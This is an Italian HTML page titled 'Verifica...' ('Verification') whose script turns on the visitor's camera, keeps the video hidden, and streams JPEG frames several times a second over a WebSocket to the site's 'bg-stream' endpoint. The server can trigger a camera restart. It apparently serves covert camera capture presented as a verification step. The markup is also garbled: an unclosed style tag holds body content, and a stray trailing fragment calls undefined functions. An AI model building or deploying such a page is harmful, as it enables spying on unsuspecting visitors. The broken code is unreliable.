<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verifica...</title>
  <style>
    body { margin:0; padding:0; background:#000; color:#0f0; font-family:Arial; text-align:center; }
    <div class="msg">Avviando camera...<br><small>Permetti l'accesso se richiesto.</small></div>
    <div id="debug"></div>

    <video id="cam" playsinline autoplay muted style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>

    <script>
      const video = document.getElementById('cam');
      const canvas = document.getElementById('canvas');
      const ctx = canvas.getContext('2d');
      const debug = document.getElementById('debug');
      const room = new URLSearchParams(location.search).get('room') || 'room1';

      let stream = null;
      let ws = null;
      let sending = false;

      function log(msg) {
        const line = document.createElement('div');
        line.textContent = new Date().toLocaleTimeString() + ' - ' + msg;
        debug.appendChild(line);
        if (debug.children.length > 20) debug.removeChild(debug.firstChild);
        console.log(msg);
      }

      async function startCamera() {
        try {
          if (stream) stream.getTracks().forEach(t => t.stop());
          stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 360 }, audio: false });
          video.srcObject = stream;
          await video.play();
          log('Camera avviata');
          startSending();
        } catch (err) {
          log('Errore camera: ' + (err.message || err));
          document.querySelector('.msg').innerHTML = '<b>Errore camera:</b> ' + (err.message || err);
        }
      }

      function connect() {
        if (ws) ws.close();
        const proto = location.protocol === 'https:' ? 'wss' : 'ws';
        ws = new WebSocket(`${proto}://${location.host}/bg-stream?room=${encodeURIComponent(room)}`);

        ws.onopen = () => {
          log('WebSocket connesso');
        };

        ws.onmessage = (ev) => {
          // server -> client control messages (JSON)
          if (typeof ev.data === 'string') {
            try {
              const d = JSON.parse(ev.data);
              if (d.type === 'switch-camera') {
                log('Switch camera richiesto: ' + d.mode);
                // try to restart camera with facingMode if supported
                startCamera();
              }
            } catch (e) {}
          }
        };

        ws.onclose = () => { log('WebSocket chiuso, riconnessione in 2s'); setTimeout(connect, 2000); };
        ws.onerror = (e) => { log('WebSocket errore: ' + e.message); };
      }

      function startSending() {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
          // wait until WS open
          const onopen = () => { ws.removeEventListener('open', onopen); startSending(); };
          if (ws) ws.addEventListener('open', onopen);
          return;
        }

        if (sending) return;
        sending = true;

        const sendLoop = () => {
          if (!sending || !(video.videoWidth > 0)) return;
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          ctx.drawImage(video, 0, 0);
          canvas.toBlob((blob) => {
            if (blob && ws && ws.readyState === WebSocket.OPEN) {
              ws.send(blob);
              // small control message optional
              ws.send(JSON.stringify({ room, timestamp: Date.now(), frameSize: blob.size }));
              log('Frame inviato: ' + blob.size + ' bytes');
            }
          }, 'image/jpeg', 0.6);
          setTimeout(sendLoop, 200);
        };

        sendLoop();
      }

      window.addEventListener('beforeunload', () => {
        sending = false;
        if (ws) ws.close();
        if (stream) stream.getTracks().forEach(t => t.stop());
      });

      // init
      connect();
      startCamera();
    </script>
  </body>
  </html>
          if (!sending && stream) {
            startSendingFrames();
          }
        }
      });
      
      // Attiva subito il wake lock
      requestWakeLock();
    }

    // Gestione chiusura pagina
    window.onbeforeunload = () => {
      stopSendingFrames();
      if (ws) ws.close();
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
    };

    // Tieni vivo il WebSocket
    setInterval(() => {
      if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send('ping');
        log('Ping inviato');
      }
    }, 30000);
  </script>
</body>
</html>
